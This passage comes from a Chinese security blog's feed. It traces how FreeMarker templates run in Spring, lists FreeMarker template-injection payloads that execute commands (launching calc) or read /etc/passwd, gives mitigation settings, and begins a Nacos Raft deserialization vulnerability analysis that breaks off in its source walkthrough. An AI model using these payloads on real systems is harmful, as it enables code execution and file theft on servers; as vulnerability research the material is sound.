alt="image.png"><br>org.springframework.web.servlet.DispatcherServlet#resolveViewName()  –&gt;<br>org.springframework.web.servlet.view.ContentNegotiatingViewResolver#resolveViewName()  –&gt;<br>org.springframework.web.servlet.view.ContentNegotiatingViewResolver#getCandidateViews()  –&gt;<br>org.springframework.web.servlet.view.AbstractCachingViewResolver#resolveViewName()  –&gt;<br>org.springframework.web.servlet.view.UrlBasedViewResolver#createView() 创建模板，此方法先判断是否为跳转为跳转也没，此处均不进入 if 最终调用super.createView()<br><img src="/image/1692602913661-b9a4d5b3-416e-4448-8e6c-2b598232ac4c.png" alt="image.png"><br>org.springframework.web.servlet.view.AbstractCachingViewResolver#createView()<br><img src="/image/1692603044878-90df8b29-677d-46d8-916b-b7feee16cab6.png" alt="image.png"><br>org.springframework.web.servlet.view.AbstractCachingViewResolver#loadView()<br><img src="/image/1692603062382-755bff01-0f67-4666-933c-e7fe33c28d6b.png" alt="image.png"><br>org.springframework.web.servlet.view.AbstractTemplateViewResolver#buildView()<br><img src="/image/1692603128711-c55b32e7-c58f-4993-b78f-c0bf705357ee.png" alt="image.png"><br>org.springframework.web.servlet.view.UrlBasedViewResolver#buildView() 此处通过 <code>this.instantiateView() </code>new 一个 FreeMarkerView 类，然后进行了一些基础赋值，构建 View 基础框架，此处设置 url 并添加 .ftl后缀。<br><img src="/image/1693463452916-d602cad0-ce1e-48f8-a288-d6352649eba2.png" alt="image.png"><br><img src="/image/1692603220587-66f3a53f-d9d8-4b69-bda2-76e5712b7b98.png" alt="image.png"><br>org.springframework.web.servlet.view.AbstractCachingViewResolver#loadView() 方法调用buildView() 后，继续调用view.checkResource()<br><img src="/image/1692603062382-755bff01-0f67-4666-933c-e7fe33c28d6b.png" alt="image.png"><br>org.springframework.web.servlet.view.freemarker.FreeMarkerView#checkResource() 判断 url 是否为空，不为空后调用 getTemplate(url, locale)</p><p><img src="/image/image-20230831213348548.png" alt="image-20230831213348548"></p><p>org.springframework.web.servlet.view.freemarker.FreeMarkerView#getTemplate(url, locale)</p><p><img src="/image/image-20230831213451184.png" alt="image-20230831213451184"></p><p>freemarker.template.Configuration#getTemplate() 调用此类同名方法,跟进this.cache.getTemplate()</p><p><img src="/image/image-20230831213617838.png" alt="image-20230831213617838"></p><p><img src="/image/image-20230831213702913.png" alt="image-20230831213702913"></p><p>freemarker.cache.TemplateCache#getTemplate() ,跟进this.getTemplateInternal()</p><p><img src="/image/image-20230831213852936.png" alt="image-20230831213852936"></p><p>freemarker.cache.TemplateCache#getTemplateInternal(),此处进行判断  –&gt;</p><p><img src="/image/image-20230831214145389.png" alt="image-20230831214145389"></p><p>freemarker.cache.TemplateCache#lookupTemplate()  –&gt;</p><p>freemarker.cache.TemplateLookupStrategy#lookup()  –&gt;</p><p>freemarker.cache.TemplateCache#lookupWithLocalizedThenAcquisitionStrategy()</p><p>…</p><p>最终调用<code>this.lookupWithLocalizedThenAcquisitionStrategy()</code>,此处会先拼接 _zh_CN,再寻找未拼接_zh_CN的模板名，调用this.findTemplateSource(path)获取模板实例。</p><p><img src="/image/image-20230831221401069.png" alt="image-20230831221401069"></p><p><img src="/image/image-20230831221447397.png" alt="image-20230831221447397"></p><p>此处获取到模板文件里数据</p><h3 id="2、解析模板"><a href="#2、解析模板" class="headerlink" title="2、解析模板"></a>2、解析模板</h3><p>回到org.springframework.web.servlet.DispatcherServlet#render()  resolveViewName()加载模板文件后使用view.render()对模板进行解析。</p><p><img src="/image/image-20230831224541162.png" alt="image-20230831224541162"></p><p>最终调用至 org.springframework.web.servlet.view.freemarker.FreeMarkerView#doRender()</p><p><img src="/image/image-20230901140401840.png" alt="image-20230901140401840"></p><p>org.springframework.web.servlet.view.freemarker.FreeMarkerView#processTemplate()</p><p><img src="/image/image-20230901140448277.png" alt="image-20230901140448277"></p><p>freemarker.template.Template#process()   调用createProcessingEnvironment()#process(),createProcessingEnvironment()返回Environment 类，故即调用 Environment#process()</p><p><img src="/image/image-20230901140537699.png" alt="image-20230901140537699"></p><p>freemarker.core.Environment#process()</p><p><img src="/image/image-20230901151520810.png" alt="image-20230901151520810"></p><p>freemarker.core.Environment#visit() 对 ftl 的文件进行遍历,若读取到一条 freeMarker 表达式，回调 visit() 方法， visit() 方法调用element.accept()</p><p><img src="/image/image-20230901151620894.png" alt="image-20230901151620894"></p><p>freemarker.core.Assignment#accept()  判断 namespaceExp 是否为 null，接着判断 this.operatorType 是否等于 65536，跟进 eval() 方法</p><p><img src="/image/image-20230902091715395.png" alt="image-20230902091715395"></p><p>freemarker.core.Expression#eval() 方法判断 constantValue 是否为 null，此处 constantValue 为 null，调用 this._eval()</p><p><img src="/image/image-20230902091752082.png" alt="image-20230902091752082"></p><p>freemarker.core.MethodCall#_eval()  此处 targetMethod 即在 ftl 语句中声明的类</p><p><img src="/image/image-20230902092640533.png" alt="image-20230902092640533"></p><p>freemarker.core.NewBI#exec() 中调用 newInstance() 初始化声明的类</p><p><img src="/image/image-20230902092809418.png" alt="image-20230902092809418"></p><p>类初始化完成后继续遍历 ftl文件，遍历至<code>value(&quot;Calc&quot;)</code> ，调用至 freemarker.core.DollarVariable#accept()，与之前调用链一致，最终调用至 freemarker.core.MethodCall#_eval() </p><p><img src="/image/image-20230902094928492.png" alt="image-20230902094928492"></p><p>此处即调用至 freemarker.template.utility.Execute#exec() 进行命令执行</p><p><img src="/image/image-20230902095100008.png" alt="image-20230902095100008"></p><h3 id="3、paylod"><a href="#3、paylod" class="headerlink" title="3、paylod"></a>3、paylod</h3><h4 id="1-、new-函数"><a href="#1-、new-函数" class="headerlink" title="(1)、new() 函数"></a>(1)、new() 函数</h4><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">&lt;#<span class="hljs-keyword">assign</span> value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?new()&gt;<span class="hljs-symbol">$</span>&#123;value(<span class="hljs-string">&quot;Calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ftl">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;Calc&quot;).start()&#125;<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;Calc&quot;) &#125;<br></code></pre></td></tr></table></figure><h4 id="2-、api-函数"><a href="#2-、api-函数" class="headerlink" title="(2)、api() 函数"></a>(2)、api() 函数</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">#assign classLoader=object?api.class.protectionDomain.classLoader&gt; <br>&lt;#assign clazz=classLoader.loadClass(&quot;ClassExposingGSON&quot;)&gt; <br>&lt;#assign field=clazz?api.getField(&quot;GSON&quot;)&gt; <br>&lt;#assign gson=field?api.get(null)&gt; <br>&lt;#assign ex=gson?api.fromJson(&quot;&#123;&#125;&quot;, classLoader.loadClass(&quot;freemarker.template.utility.Execute&quot;))&gt; <br>$&#123;ex(&quot;Calc&quot;&quot;)&#125;<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;#assign is=object?api.class.getResourceAsStream(&quot;/Test.class&quot;)&gt;<br>FILE:[&lt;#list 0..999999999 as _&gt;<br>    &lt;#assign byte=is.read()&gt;<br>    &lt;#if byte == -1&gt;<br>        &lt;#break&gt;<br>    &lt;/#if&gt;<br>$&#123;byte&#125;, &lt;/#list&gt;]<br>&lt;#assign uri=object?api.class.getResource(&quot;/&quot;).toURI()&gt;<br>&lt;#assign input=uri?api.create(&quot;file:///etc/passwd&quot;).toURL().openConnection()&gt;<br>&lt;#assign is=input?api.getInputStream()&gt;<br>FILE:[&lt;#list 0..999999999 as _&gt;<br>    &lt;#assign byte=is.read()&gt;<br>    &lt;#if byte == -1&gt;<br>        &lt;#break&gt;<br>    &lt;/#if&gt;<br>$&#123;byte&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure><h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><p>从 <strong>2.3.17</strong>版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：<br>1、UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code> 获取任何类。</p><p>2、SAFER_RESOLVER：不能加载 <code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类。<br>3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。<br>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过<code>new()</code>函数对<code>freemarker.template.utility.JythonRuntime</code>、<code>freemarker.template.utility.Execute</code>、<code>freemarker.template.utility.ObjectConstructor</code>这三个类的解析。</p><p>4、当<code>api_builtin_enabled</code>为true时才可使用api函数，而该配置在<strong>2.3.22版本</strong>之后默认为false。</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nacos 内网集群 Raft 反序列化漏洞</title>
    <link href="/2023/06/19/Nacos-%E5%86%85%E7%BD%91%E9%9B%86%E7%BE%A4-Raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/06/19/Nacos-%E5%86%85%E7%BD%91%E9%9B%86%E7%BE%A4-Raft-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a><strong>一、漏洞描述</strong></h1><p>Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。该漏洞仅影响7848端口（默认设置下），一般使用时该端口为Nacos集群间Raft协议的通信端口，不承载客户端请求，因此老版本可以通过禁止该端口来自Nacos集群外的请求达到止血目的（如部署时已进行限制或未暴露，则风险可控）。<br>漏洞利用实际需要访问到相应端口，实际风险可控。</p><h1 id="二、影响版本"><a href="#二、影响版本" class="headerlink" title="二、影响版本"></a><strong>二、影响版本</strong></h1><p>1.4.0 &lt;&#x3D; Nacos &lt; 1.4.6<br>2.0.0 &lt;&#x3D; Nacos &lt; 2.2.3</p><h1 id="三、漏洞详情"><a href="#三、漏洞详情" class="headerlink" title="三、漏洞详情"></a><strong>三、漏洞详情</strong></h1><h2 id="Nacos-中-Jraft-服务源码解析"><a href="#Nacos-中-Jraft-服务源码解析" class="headerlink" title="Nacos 中 Jraft 服务源码解析"></a>Nacos 中 <strong>Jraft 服务源码解析</strong></h2><p>当 Nacos 使用<strong>嵌入数据源</strong>（ -DembeddedStorage&#x3D;true，每个节点有一个数据源），以<strong>集群</strong>方式启动（-Dnacos.standalone&#x3D;false）时，使用raft协议，来保证数据一致性，并在1.4.1开始使用了sofa-jraft框架。<br>Nacos 内调用 Jraft 流程如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A concrete implementation of CP protocol: JRaft.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * &lt;pre&gt;</span><br><span class="hljs-comment"> *                                           ┌──────────────────────┐</span><br><span class="hljs-comment"> *            ┌──────────────────────┐       │                      ▼</span><br><span class="hljs-comment"> *            │   ProtocolManager    │       │        ┌───────────────────────────┐</span><br><span class="hljs-comment"> *            └──────────────────────┘       │        │for p in [LogProcessor4CP] │</span><br><span class="hljs-comment"> *                        │                  │        └───────────────────────────┘</span><br><span class="hljs-comment"> *                        ▼                  │                      │</span><br><span class="hljs-comment"> *      ┌──────────────────────────────────┐ │                      ▼</span><br><span class="hljs-comment"> *      │    discovery LogProcessor4CP     │ │             ┌─────────────────┐</span><br><span class="hljs-comment"> *      └──────────────────────────────────┘ │             │  get p.group()  │</span><br><span class="hljs-comment"> *                        │                  │             └─────────────────┘</span><br><span class="hljs-comment"> *                        ▼                  │                      │</span><br><span class="hljs-comment"> *                 ┌─────────────┐           │                      │</span><br><span class="hljs-comment"> *                 │ RaftConfig  │           │                      ▼</span><br><span class="hljs-comment"> *                 └─────────────┘           │      ┌──────────────────────────────┐</span><br><span class="hljs-comment"> *                        │                  │      │  create raft group service   │</span><br><span class="hljs-comment"> *                        ▼                  │      └──────────────────────────────┘</span><br><span class="hljs-comment"> *              ┌──────────────────┐         │</span><br><span class="hljs-comment"> *              │  JRaftProtocol   │         │</span><br><span class="hljs-comment"> *              └──────────────────┘         │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                     init()                │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        ▼                  │</span><br><span class="hljs-comment"> *               ┌─────────────────┐         │</span><br><span class="hljs-comment"> *               │   JRaftServer   │         │</span><br><span class="hljs-comment"> *               └─────────────────┘         │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        ▼                  │</span><br><span class="hljs-comment"> *             ┌────────────────────┐        │</span><br><span class="hljs-comment"> *             │JRaftServer.start() │        │</span><br><span class="hljs-comment"> *             └────────────────────┘        │</span><br><span class="hljs-comment"> *                        │                  │</span><br><span class="hljs-comment"> *                        └──────────────────┘</span><br><span class="hljs-comment"> * &lt;/pre&gt;</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h3 id="ProtocolManager"><a href="#ProtocolManager" class="headerlink" title="ProtocolManager"></a>ProtocolManager</h3><p>com.alibaba.nacos.core.distributed.ProtocolManager 构造方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProtocolManager</span><span class="hljs-params">(ServerMemberManager memberManager)</span> &#123;<br>    <span class="hljs-built_in">this</span>.memberManager = memberManager;<br>    NotifyCenter.registerSubscriber(<span class="hljs-built_in">this</span>);<br>&#125;<br>    <br></code></pre></td></tr></table></figure><p>此处 ServerMemberManager 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerMemberManager</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ApplicationListener</span>&lt;WebServerInitializedEvent&gt; &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">NacosAsyncRestTemplate</span> <span class="hljs-variable">asyncRestTemplate</span> <span class="hljs-operator">=</span> HttpClientBeanHolder<br>            .getNacosAsyncRestTemplate(Loggers.CORE);<br><br>    <span class="hljs-comment">//默认服务端口未 8848</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_SERVER_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-number">8848</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SERVER_PORT_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.port&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SPRING_MANAGEMENT_CONTEXT_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;management&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">MEMBER_CHANGE_EVENT_QUEUE_SIZE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nacos.member-change-event.queue.size&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_MEMBER_CHANGE_EVENT_QUEUE_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">128</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isUseAddressServer</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">DEFAULT_TASK_DELAY_TIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">5_000L</span>;<br><br>    ...<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServerMemberManager</span><span class="hljs-params">(ServletContext servletContext)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-built_in">this</span>.serverList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentSkipListMap</span>&lt;&gt;();<br>        EnvUtil.setContextPath(servletContext.getContextPath());<br>        <span class="hljs-comment">//调用init()</span><br>        init();<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NacosException &#123;<br>        Loggers.CORE.info(<span class="hljs-string">&quot;Nacos-related cluster resource initialization&quot;</span>);<br>        <span class="hljs-built_in">this</span>.port = EnvUtil.getProperty(SERVER_PORT_PROPERTY, Integer.class, DEFAULT_SERVER_PORT);<br>        <span class="hljs-built_in">this</span>.localAddress = InetUtils.getSelfIP() + <span class="hljs-string">&quot;:&quot;</span> + port;<br>        <span class="hljs-comment">//调用至 MemberUtil#singleParse(this.localAddress);</span><br>        <span class="hljs-built_in">this</span>.self = MemberUtil.singleParse(<span class="hljs-built_in">this</span>.localAddress);<br>        <span class="hljs-built_in">this</span>.self.setExtendVal(MemberMetaDataConstants.VERSION, VersionUtils.version);<br>        ...<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>MemberUtil#singleParse(this.localAddress)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_RAFT_OFFSET_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Member <span class="hljs-title function_">singleParse</span><span class="hljs-params">(String member)</span> &#123;<br>    <span class="hljs-comment">// Nacos default port is 8848</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">defaultPort</span> <span class="hljs-operator">=</span> EnvUtil.getProperty(SERVER_PORT_PROPERTY, Integer.class, DEFAULT_SERVER_PORT);<br>    <span class="hljs-comment">// Set the default Raft port information for securit</span><br>    <br>    <span class="hljs-type">String</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> member;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> defaultPort;<br>    String[] info = InternetAddressUtil.splitIPPortStr(address);<br>    <span class="hljs-keyword">if</span> (info.length &gt; <span class="hljs-number">1</span>) &#123;<br>        address = info[<span class="hljs-number">0</span>];<br>        port = Integer.parseInt(info[<span class="hljs-number">1</span>]);<br>    &#125;<br>    <br>    <span class="hljs-type">Member</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> Member.builder().ip(address).port(port).state(NodeState.UP).build();<br>    Map&lt;String, Object&gt; extendInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">4</span>);<br>    <span class="hljs-comment">// The Raft Port information needs to be set by default</span><br><span class="hljs-comment">//Jraft 默认端口7848</span><br>    extendInfo.put(MemberMetaDataConstants.RAFT_PORT, String.valueOf(calculateRaftPort(target)));<br>    extendInfo.put(MemberMetaDataConstants.READY_TO_UPGRADE, <span class="hljs-literal">true</span>);<br>    target.setExtendInfo(extendInfo);<br>    <span class="hljs-keyword">return</span> target;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateRaftPort</span><span class="hljs-params">(Member member)</span> &#123;<br><span class="hljs-comment">//端口为默认端口 -1000 即 7848</span><br>    <span class="hljs-keyword">return</span> member.getPort() - DEFAULT_RAFT_OFFSET_PORT;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="JRaftProtocol"><a href="#JRaftProtocol" class="headerlink" title="JRaftProtocol"></a>JRaftProtocol</h3><p>com.alibaba.nacos.core.distributed.raft.JRaftProtocol</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRaftProtocol</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractConsistencyProtocol</span>&lt;RaftConfig, RequestProcessor4CP&gt;<br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CPProtocol</span>&lt;RaftConfig, RequestProcessor4CP&gt; &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">initialized</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">shutdowned</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);<br><br>    <span class="hljs-comment">//此处默认为 Hessian 反序列化</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Serializer</span> <span class="hljs-variable">serializer</span> <span class="hljs-operator">=</span> SerializeFactory.getDefault();<br>    <br>    <span class="hljs-keyword">private</span> RaftConfig raftConfig;<br>    <br>    <span class="hljs-keyword">private</span> JRaftServer raftServer;<br>    <br>    <span class="hljs-keyword">private</span> JRaftMaintainService jRaftMaintainService;<br>    <br>    <span class="hljs-keyword">private</span> ServerMemberManager memberManager;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRaftProtocol</span><span class="hljs-params">(ServerMemberManager memberManager)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-built_in">this</span>.memberManager = memberManager;<br>        <span class="hljs-built_in">this</span>.raftServer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRaftServer</span>();<br>        <span class="hljs-built_in">this</span>.jRaftMaintainService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRaftMaintainService</span>(raftServer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.alibaba.nacos.consistency.SerializeFactory#getDefault()  获取到HessianSerializer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeFactory</span> &#123;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">HESSIAN_INDEX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hessian&quot;</span>.toLowerCase();<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, Serializer&gt; SERIALIZER_MAP = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">4</span>);<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">defaultSerializer</span> <span class="hljs-operator">=</span> HESSIAN_INDEX;<br>    <br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-type">Serializer</span> <span class="hljs-variable">serializer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianSerializer</span>();<br>        SERIALIZER_MAP.put(HESSIAN_INDEX, serializer);<br>        <span class="hljs-keyword">for</span> (Serializer item : NacosServiceLoader.load(Serializer.class)) &#123;<br>            SERIALIZER_MAP.put(item.name().toLowerCase(), item);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Serializer <span class="hljs-title function_">getDefault</span><span 